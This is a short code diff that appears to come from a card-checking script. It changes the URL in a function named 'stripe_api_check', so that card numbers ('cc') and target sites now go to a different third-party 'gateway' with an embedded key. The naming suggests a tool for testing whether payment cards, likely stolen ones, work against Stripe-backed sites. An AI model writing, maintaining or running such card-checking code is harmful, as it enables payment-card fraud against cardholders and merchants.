@@ -380,7 +380,7 @@ def stripe_api_check(cc, user_id=None):
                     'error': 'User stopped check'
                 }
             
-            api_url = f"https://stripe-tan-seven.vercel.app/gateway?key=hyperog&site={site}&cc={cc}"
+            api_url = f"https://wiardsclub.onrender.com/gateway=autostripe/key=wizard/site{site}&cc={cc}"
             response = requests.get(api_url, timeout=300)
             
             if response.status_code != 200:
